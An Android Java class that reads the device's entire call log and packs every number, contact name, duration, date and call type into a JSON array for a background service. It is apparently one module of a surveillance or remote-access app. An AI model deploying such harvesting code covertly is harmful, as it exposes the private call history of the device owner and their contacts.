package com.behavioralanalysis.service;

import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Calls {
    public static JSONArray get() {
        JSONArray array = new JSONArray();
        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor cursor = MainService.getContext().getContentResolver().query(allCalls, null, null, null, null);

        try {
            while (cursor.moveToNext()) {
                JSONObject object = new JSONObject();
                object.put(
                        "number",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.NUMBER)
                        )
                );
                object.put(
                        "name",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                        )
                );
                object.put(
                        "duration",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.DURATION)
                        )
                );
                object.put(
                        "date",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.DATE)
                        )
                );
                object.put(
                        "type",
                        Integer.parseInt(cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.TYPE)
                        ))
                );
                array.put(object);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return array;
    }
}
